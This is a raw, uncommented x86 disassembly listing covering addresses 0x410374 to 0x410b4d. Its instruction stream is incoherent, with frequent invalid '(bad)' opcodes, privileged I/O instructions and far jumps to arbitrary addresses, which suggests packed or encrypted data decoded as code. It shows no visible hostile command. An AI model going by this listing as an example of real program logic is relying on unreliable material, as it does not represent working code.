  410374:	mov    eax,ds:0x4c8d13e5
  410379:	loope  0x4103b4
  41037b:	pop    ebx
  41037c:	fcomp  QWORD PTR [eax]
  41037e:	test   BYTE PTR [esi+0x6804e15a],dl
  410384:	int    0xa4
  410386:	popf   
  410387:	xchg   esp,eax
  410388:	xchg   DWORD PTR [eax+esi*4+0x54],edi
  41038c:	add    BYTE PTR [edi+0x1f4eb285],bh
  410392:	in     eax,dx
  410393:	mov    cl,0x8e
  410395:	pop    ds
  410396:	clc    
  410397:	push   es
  410398:	cld    
  410399:	jmp    0x4baae1b5
  41039e:	mov    ebx,0x6007c7eb
  4103a3:	mov    dl,0x24
  4103a5:	bound  ebp,QWORD PTR [ebx]
  4103a7:	add    edi,edi
  4103a9:	xchg   edx,eax
  4103aa:	xchg   edx,eax
  4103ab:	lahf   
  4103ac:	push   es
  4103ad:	mov    bh,0xda
  4103af:	sub    ebx,DWORD PTR [ebx]
  4103b1:	arpl   WORD PTR [edi+0x5],di
  4103b4:	arpl   WORD PTR [esi-0x26d7c502],bx
  4103ba:	into   
  4103bb:	clc    
  4103bc:	mov    ah,0xa4
  4103be:	gs loop 0x41042b
  4103c1:	fist   WORD PTR [ebp-0x49036d07]
  4103c7:	push   0x105ed528
  4103cc:	sub    eax,0x663bd6b5
  4103d1:	pop    ecx
  4103d2:	in     al,0xf7
  4103d4:	punpckhwd mm3,QWORD PTR [eax+eax*4-0x4e8515b9]
  4103dc:	xchg   ch,bl
  4103de:	sbb    bh,BYTE PTR [edx-0x6569d2e9]
  4103e4:	scas   al,BYTE PTR es:[edi]
  4103e5:	sbb    eax,DWORD PTR ds:0x5fa4eea0
  4103eb:	aaa    
  4103ec:	popa   
  4103ed:	add    BYTE PTR [edx],0x54
  4103f0:	pushf  
  4103f1:	pop    ds
  4103f2:	in     al,dx
  4103f3:	mov    dh,0x5a
  4103f5:	or     esi,DWORD PTR [ebx+0x61]
  4103f8:	add    BYTE PTR [ebx+eiz*8-0x1e],ah
  4103fc:	mov    esp,0xb4ff00a6
  410401:	add    esi,DWORD PTR [edx+ebx*1]
  410404:	sub    edi,edx
  410406:	(bad)  
  410407:	(bad)  
  410408:	into   
  410409:	mov    esp,0x4c8f7b2f
  41040e:	stos   DWORD PTR es:[edi],eax
  41040f:	add    DWORD PTR [ecx+0x72dc83e],eax
  410415:	test   eax,0x3b87c5c7
  41041b:	inc    esp
  41041c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41041d:	jae    0x4103e1
  41041f:	adc    DWORD PTR [ecx],ebx
  410421:	fidiv  WORD PTR [ebx+0x29ec6d60]
  410427:	cmp    BYTE PTR [esi+eiz*4-0x58],cl
  41042b:	dec    edx
  41042c:	test   BYTE PTR [ecx+0x2a],cl
  41042f:	sub    eax,0x20db113e
  410434:	push   edi
  410435:	sahf   
  410436:	addr16 adc al,0xc
  410439:	mov    bl,0x82
  41043b:	inc    esp
  41043c:	jg     0x4104b1
  41043e:	sbb    DWORD PTR [edi-0x50],eax
  410441:	pop    ds
  410442:	scas   eax,DWORD PTR es:[edi]
  410443:	adc    BYTE PTR [eax+0x37],bl
  410446:	cmp    al,0x2b
  410448:	stos   BYTE PTR es:[edi],al
  410449:	add    al,0xa9
  41044b:	inc    ebp
  41044c:	ds sbb esi,0x6a9232bb
  410453:	popf   
  410454:	(bad)  
  410455:	sbb    edx,ebx
  410457:	add    al,0xbd
  410459:	fisubr WORD PTR [ebx-0x33]
  41045c:	add    eax,0x3576495c
  410461:	xchg   ebp,eax
  410462:	call   0x54f7:0xa1a14b82
  410469:	popf   
  41046a:	imul   ebx,DWORD PTR [esi+0x69e52395],0x6691b8e2
  410474:	jne    0x410498
  410476:	loope  0x41044d
  410478:	or     DWORD PTR [ebp+0x3dc823ab],ebp
  41047e:	mov    cl,0xaa
  410480:	(bad)  
  410481:	fild   QWORD PTR [ebp+0x57]
  410484:	data16 mov WORD PTR [ebx+0x15],fs
  410488:	cmp    BYTE PTR [edi+0x46],al
  41048b:	ja     0x410472
  41048d:	mov    ebx,0x25a49927
  410492:	popf   
  410493:	pop    esp
  410494:	jl     0x410466
  410496:	bound  edi,QWORD PTR [esi+ebx*4]
  410499:	pop    ebx
  41049a:	or     eax,ebp
  41049c:	cli    
  41049d:	(bad)  
  41049e:	jmp    0x14a5:0xa42e1704
  4104a5:	and    al,0x37
  4104a7:	ret    0x8c43
  4104aa:	push   0xbc54484f
  4104af:	je     0x410466
  4104b1:	test   eax,0x2fcf056
  4104b6:	jge    0x4104fe
  4104b8:	jmp    0xf8fb4128
  4104bd:	mov    dl,0xcc
  4104bf:	dec    ebp
  4104c0:	ins    BYTE PTR es:[edi],dx
  4104c1:	aaa    
  4104c2:	adc    esp,ecx
  4104c4:	std    
  4104c5:	clc    
  4104c6:	xor    BYTE PTR [edx+eiz*2],dl
  4104c9:	aad    0x23
  4104cb:	lods   eax,DWORD PTR ds:[esi]
  4104cc:	sub    eax,0xb5afcef2
  4104d1:	pop    edx
  4104d2:	std    
  4104d3:	cdq    
  4104d4:	mov    ebx,0x7dca3ec1
  4104d9:	jns    0x410492
  4104db:	je     0x4104b7
  4104dd:	imul   eax,DWORD PTR [esi-0x57187660],0x29
  4104e4:	mov    eax,0x4a431395
  4104e9:	inc    ebp
  4104ea:	or     ch,BYTE PTR [ebp+edi*2-0x449ac155]
  4104f1:	arpl   ax,bx
  4104f3:	pop    ecx
  4104f4:	xor    eax,0x322a1b5a
  4104f9:	sbb    edx,DWORD PTR [eax+esi*1]
  4104fc:	or     bl,BYTE PTR [ecx+0x1ca587b4]
  410502:	leave  
  410503:	(bad)  
  410504:	mov    dl,0x3f
  410506:	ja     0x41048e
  410508:	sar    DWORD PTR [eax+0x47d4ed4f],cl
  41050e:	call   0xebd5:0xc66d89e3
  410515:	pop    ss
  410516:	adc    cl,BYTE PTR [eax-0x21dfc80a]
  41051c:	inc    ebx
  41051d:	or     BYTE PTR [edi+0x177b9e4d],bl
  410523:	je     0x410502
  410525:	popa   
  410526:	(bad)  
  410527:	scas   eax,DWORD PTR es:[edi]
  410528:	idiv   BYTE PTR [edi]
  41052a:	jmp    0x79a1:0xfdcfb14b
  410531:	aaa    
  410532:	outs   dx,DWORD PTR ds:[esi]
  410533:	call   0x70c25fb1
  410538:	jmp    0xec85:0xcc53ea6c
  41053f:	inc    ecx
  410540:	ja     0x41054b
  410542:	xor    eax,0x8c9e836a
  410547:	jb     0x4104db
  410549:	pushf  
  41054a:	or     bl,BYTE PTR [esi-0x1f]
  41054d:	lods   eax,DWORD PTR ds:[esi]
  41054e:	lods   eax,DWORD PTR ds:[esi]
  41054f:	lds    edx,FWORD PTR [edi+0x68b2d889]
  410555:	enter  0xc93e,0xa4
  410559:	jmp    0x73c54e84
  41055e:	nop
  41055f:	sub    BYTE PTR [edi-0x5b],dl
  410562:	jno    0x410580
  410564:	lds    ecx,FWORD PTR [edx-0x7f0389fe]
  41056a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41056b:	xchg   ebx,eax
  41056c:	push   cs
  41056d:	aam    0x8a
  41056f:	int    0x17
  410571:	aad    0xcf
  410573:	adc    al,0x8f
  410575:	ss pop edx
  410577:	mov    DWORD PTR [edi-0x75d439b8],esp
  41057d:	jg     0x410580
  41057f:	pop    edi
  410580:	or     BYTE PTR [ebx-0x31],0x55
  410584:	out    dx,al
  410585:	daa    
  410586:	ficomp WORD PTR [edx-0x30]
  410589:	xor    al,0xfb
  41058b:	push   cs
  41058c:	inc    esi
  41058d:	sub    al,bh
  41058f:	adc    edi,eax
  410591:	mov    bl,0xf8
  410593:	mov    ah,0x32
  410595:	scas   al,BYTE PTR es:[edi]
  410596:	add    al,0x27
  410598:	mov    eax,ds:0xe9f45ab8
  41059d:	inc    ebx
  41059e:	js     0x410601
  4105a0:	mov    DWORD PTR [esi+0x1816f677],ebp
  4105a6:	xor    ebx,ebp
  4105a8:	add    al,BYTE PTR ds:0xd9f8cb65
  4105ae:	dec    edx
  4105af:	push   ss
  4105b0:	sbb    dl,BYTE PTR [esi+0x69e7ecb9]
  4105b6:	push   ss
  4105b7:	pop    ebx
  4105b8:	jl     0x410566
  4105ba:	mov    ?,WORD PTR [ecx]
  4105bc:	add    ebp,DWORD PTR ds:0x2ce9e352
  4105c2:	push   ds
  4105c3:	push   bx
  4105c5:	test   eax,esi
  4105c7:	and    eax,0x71a596fa
  4105cc:	adc    bl,ch
  4105ce:	inc    ebx
  4105cf:	xor    ah,BYTE PTR [ebx]
  4105d1:	clc    
  4105d2:	dec    ecx
  4105d3:	inc    edx
  4105d4:	hlt    
  4105d5:	ja     0x410650
  4105d7:	sub    al,0xd4
  4105d9:	sbb    dh,bh
  4105db:	xchg   esp,eax
  4105dc:	lods   al,BYTE PTR ds:[esi]
  4105dd:	dec    ebx
  4105de:	bound  eax,QWORD PTR [ecx]
  4105e0:	or     BYTE PTR [ecx-0x3e4a093c],ah
  4105e6:	cmp    BYTE PTR [ebx+eax*1+0x5a92aef9],al
  4105ed:	pop    ds
  4105ee:	out    dx,al
  4105ef:	iret   
  4105f0:	cwde   
  4105f1:	fsubr  QWORD PTR [edx+ebx*2-0x17]
  4105f5:	mov    al,ds:0xffd1d3ad
  4105fa:	jle    0x41063a
  4105fc:	cld    
  4105fd:	sub    dh,bh
  4105ff:	loopne 0x4105e2
  410601:	call   0x5c95cfc8
  410606:	out    dx,al
  410607:	push   eax
  410608:	sub    DWORD PTR [edx+0x4b],ecx
  41060b:	nop
  41060c:	cs in  al,0x68
  41060f:	inc    ecx
  410610:	out    dx,al
  410611:	gs (bad) 
  410613:	pop    edx
  410614:	loope  0x4105f1
  410616:	cld    
  410617:	test   BYTE PTR [ebx-0x55],ch
  41061a:	daa    
  41061b:	dec    eax
  41061c:	pop    edx
  41061d:	push   cs
  41061e:	imul   eax,DWORD PTR [edi],0x71043f13
  410624:	enter  0x9f59,0xe
  410628:	mov    eax,0x82d4cd73
  41062d:	stc    
  41062e:	les    edx,FWORD PTR [edi]
  410630:	or     al,0xfd
  410632:	mov    bh,0x36
  410634:	sub    dl,ah
  410636:	out    dx,al
  410637:	dec    ebp
  410638:	stos   BYTE PTR es:[edi],al
  410639:	xchg   ecx,eax
  41063a:	xchg   BYTE PTR [edx+0x4c725cc3],bl
  410640:	(bad)  
  410641:	addr16 call 0xdb16:0x962206b1
  410649:	pop    esi
  41064a:	ins    DWORD PTR es:[edi],dx
  41064b:	repnz push esi
  41064d:	lahf   
  41064e:	mov    ebp,0xda026a2e
  410653:	das    
  410654:	sbb    BYTE PTR [ebp+0x61],bl
  410657:	(bad)  
  410658:	xor    DWORD PTR [edi+edi*2-0x64c3fb0b],esi
  41065f:	imul   ecx,DWORD PTR [ebp-0x704a16af],0x30
  410666:	mov    ecx,0xd247e7f3
  41066b:	fdivr  DWORD PTR [eax]
  41066d:	and    al,0xb8
  41066f:	mov    DWORD PTR [esp+ebp*8-0x7ce3d7a4],ebx
  410676:	mov    edi,0x8d9664b2
  41067b:	jnp    0x4106bd
  41067d:	xchg   ebx,eax
  41067e:	scas   al,BYTE PTR es:[edi]
  41067f:	inc    edx
  410680:	xor    edx,edx
  410682:	mov    ch,0x3c
  410684:	sub    eax,0x9eaa2f6
  410689:	imul   ecx,DWORD PTR [eax-0x74],0x8bb296a1
  410690:	jno    0x41068c
  410692:	cs pop ss
  410694:	retf   0xc9dc
  410697:	mov    dl,0xe2
  410699:	sub    eax,0x392f3315
  41069e:	or     al,0x66
  4106a0:	and    bl,al
  4106a2:	cdq    
  4106a3:	mov    BYTE PTR [eax+edx*8],dh
  4106a6:	inc    ebx
  4106a7:	fucomip st,st(2)
  4106a9:	or     BYTE PTR [eax+0x6c],bl
  4106ac:	mov    al,ds:0x1246968d
  4106b1:	xchg   ebx,eax
  4106b2:	xchg   ebx,eax
  4106b3:	stos   DWORD PTR es:[edi],eax
  4106b4:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4106b6:	xor    DWORD PTR [edx],esi
  4106b8:	pop    esp
  4106b9:	call   0x8a53:0x1f83dc51
  4106c0:	jp     0x410739
  4106c2:	pop    es
  4106c3:	dec    esp
  4106c4:	push   ss
  4106c5:	f2xm1  
  4106c7:	div    DWORD PTR [ebx-0x4b]
  4106ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106cb:	mov    bl,0x80
  4106cd:	outs   dx,BYTE PTR ds:[esi]
  4106ce:	pop    eax
  4106cf:	jbe    0x4106a8
  4106d1:	aad    0x8d
  4106d3:	mov    ebx,0xbe935d25
  4106d8:	mov    ds:0xfb62b7f7,eax
  4106dd:	dec    esp
  4106de:	xchg   edi,eax
  4106df:	popf   
  4106e0:	jb     0x4106fe
  4106e2:	dec    edx
  4106e3:	xchg   edx,eax
  4106e4:	lods   eax,DWORD PTR ds:[esi]
  4106e5:	mov    ecx,0x5c824b32
  4106ea:	or     edi,DWORD PTR [edx]
  4106ec:	or     DWORD PTR [edx+0x1f],esp
  4106ef:	retf   0xdaf8
  4106f2:	inc    edi
  4106f3:	test   DWORD PTR [ebx+ebp*8-0x33a277b8],ebx
  4106fa:	repnz sbb cl,bh
  4106fd:	in     eax,dx
  4106fe:	or     esi,ecx
  410700:	cs pushf 
  410702:	or     DWORD PTR [edx-0x41],ecx
  410705:	cmp    bh,BYTE PTR [ebp+0x630724a7]
  41070b:	adc    eax,DWORD PTR [edi+ebx*2]
  41070e:	mov    ds:0x99ed8e0a,eax
  410713:	sbb    ebx,DWORD PTR ds:0x91cfd1b8
  410719:	xchg   BYTE PTR [ecx+ebp*4],ch
  41071c:	repnz sbb DWORD PTR [edi+0x5f12075c],0x37
  410724:	jle    0x41079f
  410726:	pop    eax
  410727:	ja     0x4106cc
  410729:	out    0x86,eax
  41072b:	pusha  
  41072c:	pushf  
  41072d:	adc    esi,ecx
  41072f:	ss (bad) 
  410731:	sbb    DWORD PTR [edx+0x1d],edi
  410734:	cdq    
  410735:	shl    ebx,0xcc
  410738:	mov    bl,0x6c
  41073a:	mov    ch,0xf5
  41073c:	retf   0x1cc
  41073f:	loopne 0x41073b
  410741:	push   es
  410742:	ja     0x4107af
  410744:	sub    DWORD PTR [edx],ebx
  410746:	and    al,0xe1
  410748:	clc    
  410749:	(bad)  
  41074a:	aad    0xf
  41074c:	std    
  41074d:	mov    DWORD PTR [ebx+0x10],ecx
  410750:	test   BYTE PTR [eax],dl
  410752:	xchg   ecx,eax
  410753:	dec    eax
  410754:	push   ecx
  410755:	not    cl
  410757:	pop    ecx
  410758:	retf   0x877a
  41075b:	ds mov edx,0xd63f7470
  410761:	aaa    
  410762:	dec    BYTE PTR [esi-0x796b8bf9]
  410768:	popa   
  410769:	pop    ecx
  41076a:	xchg   ebp,eax
  41076b:	icebp  
  41076c:	idiv   ah
  41076e:	push   ebx
  41076f:	lea    ecx,[ecx-0x6b8420d0]
  410775:	sbb    BYTE PTR [edx-0x65],al
  410778:	popf   
  410779:	push   eax
  41077a:	xchg   DWORD PTR [esi+0x2],edx
  41077d:	fidiv  WORD PTR [ebx]
  41077f:	arpl   WORD PTR [edx+0x5b],sp
  410782:	nop
  410783:	jno    0x410722
  410785:	mov    esp,0xc4ce0012
  41078a:	gs pop edi
  41078c:	xchg   esp,eax
  41078d:	lods   al,BYTE PTR ds:[esi]
  41078e:	ret    
  41078f:	nop
  410790:	or     al,0x39
  410792:	add    DWORD PTR [ebx+0x36],ebp
  410795:	outs   dx,BYTE PTR ds:[esi]
  410796:	(bad)  
  410797:	fcomp  DWORD PTR [edx-0x6c]
  41079a:	inc    ecx
  41079b:	test   eax,0x63cf83d0
  4107a0:	leave  
  4107a1:	mov    ds:0xf600d65b,eax
  4107a6:	jno    0x4107f8
  4107a8:	pop    esi
  4107a9:	or     eax,0x70af9f53
  4107ae:	fistp  DWORD PTR [edx+ebx*8-0x7dcf22ce]
  4107b5:	jmp    0x41078d
  4107b7:	(bad)  
  4107b8:	ficomp DWORD PTR [edi]
  4107ba:	pop    ebp
  4107bb:	jbe    0x4107c6
  4107bd:	sti    
  4107be:	push   ecx
  4107bf:	fcom   QWORD PTR [eax-0x6fc838fe]
  4107c5:	mov    BYTE PTR [ecx],bl
  4107c7:	mov    bl,BYTE PTR [ebx]
  4107c9:	xchg   esp,eax
  4107ca:	enter  0x2fda,0xbf
  4107ce:	inc    esp
  4107cf:	sbb    bl,BYTE PTR ds:0xfaa94865
  4107d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107d6:	enter  0x75f5,0x16
  4107da:	mov    al,0x3
  4107dc:	arpl   WORD PTR [esi+0x31220a1b],bx
  4107e2:	cmp    al,0xf3
  4107e4:	mov    ah,0x19
  4107e6:	cwde   
  4107e7:	(bad)  
  4107e8:	lods   al,BYTE PTR ds:[esi]
  4107e9:	ror    BYTE PTR [ebx+0x34],cl
  4107ec:	pusha  
  4107ed:	ins    BYTE PTR es:[edi],dx
  4107ee:	retf   
  4107ef:	cwde   
  4107f0:	sub    DWORD PTR [eax-0x7fa3735d],edi
  4107f6:	shr    DWORD PTR [ecx+0x1a],0x4f
  4107fa:	push   ss
  4107fb:	retf   0xb19e
  4107fe:	pop    esp
  4107ff:	jmp    0x4107c9
  410801:	loop   0x4107d3
  410803:	mov    cl,0xd7
  410805:	push   edx
  410806:	or     DWORD PTR [edi],0x8b3597b4
  41080c:	cmp    al,BYTE PTR [edx-0x68daa87]
  410812:	out    dx,al
  410813:	pop    ss
  410814:	cmp    al,0xe6
  410816:	mov    cl,0xae
  410818:	mov    bh,0xa8
  41081a:	mov    ecx,DWORD PTR [ebp+eax*8+0x5c]
  41081e:	aam    0x7f
  410820:	jbe    0x41086e
  410822:	daa    
  410823:	das    
  410824:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  410826:	or     DWORD PTR [ebx-0x1ec381fe],eax
  41082c:	iret   
  41082d:	inc    edi
  41082e:	repz pop esi
  410830:	sbb    edx,DWORD PTR [eax+0x3969c912]
  410836:	xor    DWORD PTR [esi+0x1abc836f],edi
  41083c:	scas   eax,DWORD PTR es:[edi]
  41083d:	jns    0x4107f8
  41083f:	mov    esi,0xb05422be
  410844:	(bad)  
  410845:	rcl    BYTE PTR [ecx],1
  410847:	aam    0x66
  410849:	jnp    0x410883
  41084b:	dec    esi
  41084c:	add    al,0x4f
  41084e:	or     al,0xb4
  410850:	retf   0xf8f0
  410853:	cdq    
  410854:	out    0x60,eax
  410856:	test   DWORD PTR ds:0x258637ae,edi
  41085c:	lahf   
  41085d:	loope  0x410855
  41085f:	mov    edx,0x2b55c356
  410864:	xchg   ecx,eax
  410865:	jmp    0x410829
  410867:	mov    BYTE PTR [esi-0x41],dl
  41086a:	aam    0x36
  41086c:	pop    esp
  41086d:	xor    DWORD PTR [ebp+0x5a],edi
  410870:	rcr    DWORD PTR [edx+esi*4-0x44d6e8ac],1
  410877:	ins    BYTE PTR es:[edi],dx
  410878:	mov    ch,0x63
  41087a:	add    BYTE PTR [esi],cl
  41087c:	xor    BYTE PTR [ebx+0x6ae101d0],bl
  410882:	mov    es,WORD PTR [ebx]
  410884:	inc    edi
  410885:	jle    0x4108a3
  410887:	(bad)  
  410888:	mov    ch,BYTE PTR [ecx]
  41088a:	adc    al,bh
  41088c:	stos   BYTE PTR es:[edi],al
  41088d:	sbb    eax,0xa5616393
  410892:	xchg   edi,eax
  410893:	mov    bh,0x51
  410895:	and    ecx,DWORD PTR [esi+0x6e7966c5]
  41089b:	push   edi
  41089c:	sbb    BYTE PTR [edi+0x11],0x9e
  4108a0:	xchg   edx,eax
  4108a1:	ror    BYTE PTR [esi+0x31],0x82
  4108a5:	in     eax,0xe
  4108a7:	hlt    
  4108a8:	add    BYTE PTR [ebx],dh
  4108aa:	push   ss
  4108ab:	cmp    BYTE PTR [edx],cl
  4108ad:	xchg   esp,eax
  4108ae:	mov    WORD PTR [eax-0x7],es
  4108b1:	or     al,0xe9
  4108b3:	jmp    0x6abaf416
  4108b8:	imul   esp,DWORD PTR [ecx-0x25345dbf],0x54
  4108bf:	scas   al,BYTE PTR es:[edi]
  4108c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108c1:	push   ss
  4108c2:	push   0xffffffe1
  4108c4:	arpl   ax,di
  4108c6:	push   0xffffffb9
  4108c8:	mov    ds:0x35048d71,al
  4108cd:	jp     0x410868
  4108cf:	inc    eax
  4108d0:	cdq    
  4108d1:	jmp    0x6ddfe4d4
  4108d6:	ficomp DWORD PTR [ebp-0x2d]
  4108d9:	add    eax,0xfed05f82
  4108de:	addr16 mov ebx,0x3c7531f6
  4108e4:	aad    0x2d
  4108e6:	push   esp
  4108e7:	add    DWORD PTR [ecx+0x47],0x74c58ac8
  4108ee:	and    ebp,ebx
  4108f0:	or     BYTE PTR [esp+esi*8],bl
  4108f3:	mov    al,ds:0x82c2b25c
  4108f8:	out    dx,al
  4108f9:	imul   eax,DWORD PTR fs:[edx-0x1558d038],0x2f4e5248
  410904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410905:	mov    ch,0xc1
  410907:	mov    fs,WORD PTR [eax]
  410909:	add    al,0x9b
  41090b:	inc    edi
  41090c:	into   
  41090d:	leave  
  41090e:	pop    ebp
  41090f:	pushf  
  410910:	daa    
  410911:	stc    
  410912:	int    0x69
  410914:	adc    ecx,DWORD PTR [esi]
  410916:	jbe    0x410903
  410918:	sub    DWORD PTR ss:[edi*1-0x59a3f3ee],eax
  410920:	les    edx,FWORD PTR [eax+eax*1+0x6d94ccc5]
  410927:	mov    bh,BYTE PTR [ecx]
  410929:	xor    bh,al
  41092b:	or     ecx,DWORD PTR [edi+0x4e]
  41092e:	pop    ecx
  41092f:	stos   BYTE PTR es:[edi],al
  410930:	or     DWORD PTR [edx],eax
  410932:	test   eax,0x2283d58
  410937:	jmp    0xbac7d57d
  41093c:	shl    BYTE PTR [ecx-0x7954a47],cl
  410942:	imul   esp,ebx,0xffffff87
  410945:	xor    esp,DWORD PTR [esi+edx*2+0x2c]
  410949:	retf   
  41094a:	xor    ebx,edi
  41094c:	xchg   edx,eax
  41094d:	call   0x60e81b48
  410952:	gs cdq 
  410954:	fisubr DWORD PTR [esi+0x70]
  410957:	jmp    0x410958
  410959:	xchg   edx,eax
  41095a:	cdq    
  41095b:	or     eax,0x727c48e0
  410960:	pop    edi
  410961:	add    al,0xad
  410963:	mov    eax,0xc797aea3
  410968:	mov    ds:0xd3f3a175,al
  41096d:	mov    BYTE PTR [edx+0x74],cl
  410970:	push   cs
  410971:	and    al,0x53
  410973:	popa   
  410974:	mov    esi,0xc4e1acfb
  410979:	cs retf 0xe607
  41097d:	jmp    0x1b169ed6
  410982:	imul   ebx,DWORD PTR [edx],0xc63d760a
  410988:	xor    ebx,DWORD PTR [edi+0x29d3cb67]
  41098e:	pusha  
  41098f:	ins    BYTE PTR es:[edi],dx
  410990:	out    dx,eax
  410991:	sti    
  410992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410993:	dec    edi
  410994:	dec    ebp
  410995:	addr16 aam 0xbc
  410998:	xchg   BYTE PTR [edi],dl
  41099a:	retf   
  41099b:	adc    ecx,edi
  41099d:	cwde   
  41099e:	ins    DWORD PTR es:[edi],dx
  41099f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109a0:	repnz sar DWORD PTR [ebp-0x3b617f53],cl
  4109a7:	test   eax,0x9ac950fa
  4109ac:	mov    ebp,0x65e57067
  4109b1:	mov    ebx,0x16dc732a
  4109b6:	call   0xbe0271b4
  4109bb:	dec    edx
  4109bc:	mov    edi,0x24e5f203
  4109c1:	loop   0x4109db
  4109c3:	jb     0x410980
  4109c5:	inc    ebx
  4109c6:	add    DWORD PTR [edx+0x30],ecx
  4109c9:	sbb    ah,BYTE PTR [ecx]
  4109cb:	jle    0x41098d
  4109cd:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109cf:	ret    
  4109d0:	xor    DWORD PTR [esi-0x66],ecx
  4109d3:	jns    0x4109d2
  4109d5:	inc    eax
  4109d6:	cwde   
  4109d7:	push   0xffffffa7
  4109d9:	and    eax,DWORD PTR [edi+0x5d2fed3]
  4109df:	xor    ah,BYTE PTR [ebx]
  4109e1:	add    edi,DWORD PTR [esi+ebx*2]
  4109e4:	sar    BYTE PTR [ebp+edi*1+0x6c],cl
  4109e8:	outs   dx,BYTE PTR ds:[esi]
  4109e9:	sbb    eax,0x63341db3
  4109ee:	mov    dl,0xb1
  4109f0:	sbb    ebx,esi
  4109f2:	jbe    0x4109cf
  4109f4:	je     0x410a2b
  4109f6:	ret    0xeba6
  4109f9:	add    esp,esi
  4109fb:	les    esp,FWORD PTR [ecx-0x3f]
  4109fe:	cmc    
  4109ff:	mov    ds:0xbe2b4a92,eax
  410a04:	sar    BYTE PTR [esi-0x5e8af4ab],cl
  410a0a:	xchg   esi,eax
  410a0b:	fcom   DWORD PTR [edx-0x48]
  410a0e:	pop    esp
  410a0f:	mov    ebp,DWORD PTR [eax]
  410a11:	fsub   DWORD PTR [ecx]
  410a13:	(bad)  
  410a14:	mov    ds:0x31a81281,al
  410a19:	jnp    0x4109ab
  410a1b:	not    DWORD PTR [esi-0x5d]
  410a1e:	rsm    
  410a20:	popa   
  410a21:	(bad)  
  410a22:	mov    esp,0x70cd27ab
  410a27:	sbb    BYTE PTR [edi-0x5fc27b17],0x3c
  410a2e:	fwait
  410a2f:	mov    ebx,DWORD PTR [edi]
  410a31:	gs adc al,0xf
  410a34:	int3   
  410a35:	jnp    0x4109f4
  410a37:	push   edi
  410a38:	mov    dh,0x1
  410a3a:	or     al,0xff
  410a3c:	ins    BYTE PTR es:[edi],dx
  410a3d:	cmp    BYTE PTR [esi-0x6b92b5a0],ah
  410a43:	adc    edi,DWORD PTR [esi+esi*4]
  410a46:	push   esi
  410a47:	jno    0x410a4f
  410a49:	and    eax,DWORD PTR [eax]
  410a4b:	je     0x410acb
  410a4d:	sbb    eax,0xffe0a175
  410a52:	hlt    
  410a53:	push   0x493950b1
  410a58:	mov    esp,0x67ed89ff
  410a5d:	pop    ebp
  410a5e:	jmp    0x2bb48797
  410a63:	leave  
  410a64:	push   ecx
  410a65:	es iret 
  410a67:	jecxz  0x410a32
  410a69:	xchg   ebx,eax
  410a6a:	and    bl,bl
  410a6c:	jno    0x410aac
  410a6e:	js     0x410aac
  410a70:	and    ah,ah
  410a72:	xchg   ecx,eax
  410a73:	mov    edx,0x3ac8e2e2
  410a78:	mov    ebx,0x486a1173
  410a7d:	xchg   esi,eax
  410a7e:	mov    ch,0x6f
  410a80:	or     cl,bl
  410a82:	sub    DWORD PTR [ebx+0x8],eax
  410a85:	outs   dx,DWORD PTR ds:[esi]
  410a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a87:	lock add DWORD PTR [esp+ebx*1+0x2a4df136],0x86024984
  410a93:	jae    0x410a39
  410a95:	leave  
  410a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a97:	jno    0x410a41
  410a99:	test   al,0x4b
  410a9b:	push   esi
  410a9c:	shr    DWORD PTR [esi-0x29],0x32
  410aa0:	adc    eax,0xd661189f
  410aa5:	stos   DWORD PTR es:[edi],eax
  410aa6:	inc    ecx
  410aa7:	fild   WORD PTR [edx]
  410aa9:	xchg   esp,eax
  410aaa:	stos   BYTE PTR es:[edi],al
  410aab:	es std 
  410aad:	xchg   esi,eax
  410aae:	and    DWORD PTR [edx],esi
  410ab0:	add    bh,BYTE PTR [ebp+edx*4+0x2c9e9f70]
  410ab7:	shl    BYTE PTR ds:0x84994219,cl
  410abd:	adc    al,0xae
  410abf:	test   BYTE PTR [ebx-0x4c],dl
  410ac2:	sbb    al,0xfc
  410ac4:	or     DWORD PTR [ebp+eax*2+0x2],ebx
  410ac8:	mov    ecx,0xdd523800
  410acd:	or     ecx,DWORD PTR [eax-0x78bd9457]
  410ad3:	push   0xb21145ad
  410ad8:	ror    ebx,1
  410ada:	mov    DWORD PTR [esi+0x76f0efab],esp
  410ae0:	(bad)  
  410ae1:	clc    
  410ae2:	mov    bh,0xf4
  410ae4:	jnp    0x410aa5
  410ae6:	mov    cl,0x90
  410ae8:	cmp    edi,eax
  410aea:	cwde   
  410aeb:	add    ebp,edx
  410aed:	hlt    
  410aee:	inc    ebp
  410aef:	imul   eax,edi,0x3a
  410af2:	ror    DWORD PTR [esi+0x3593332e],cl
  410af8:	or     dh,dl
  410afa:	shl    DWORD PTR [edx-0x2791f16a],0xfe
  410b01:	rol    esp,1
  410b03:	xor    DWORD PTR [eax+0x1],0x57
  410b07:	imul   esi,eax,0xffffffc6
  410b0a:	mov    bh,0x3f
  410b0c:	adc    BYTE PTR [ebx+0x4d],bh
  410b0f:	cmc    
  410b10:	data16 jl 0x410b31
  410b13:	fbstp  TBYTE PTR [ebx+edi*2-0x5fc64f8]
  410b1a:	mov    dh,0x17
  410b1c:	test   ecx,esi
  410b1e:	adc    BYTE PTR [ebp-0x5bf3482f],bl
  410b24:	xor    edi,ebp
  410b26:	ins    BYTE PTR es:[edi],dx
  410b27:	stos   BYTE PTR es:[edi],al
  410b28:	or     esp,edx
  410b2a:	push   0xeaa6b7d0
  410b2f:	mov    WORD PTR [eax-0x3a],?
  410b32:	mov    esp,0xa5d1c13b
  410b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b38:	sbb    ebx,DWORD PTR [edi-0x1aa152c4]
  410b3e:	inc    ebx
  410b3f:	jae    0x410b6e
  410b41:	add    edi,DWORD PTR [ecx*1+0x44356f67]
  410b48:	lahf   
  410b49:	mov    dl,0x96
  410b4b:	pop    esp
  410b4c:	pop    ebx
  410b4d:	into   
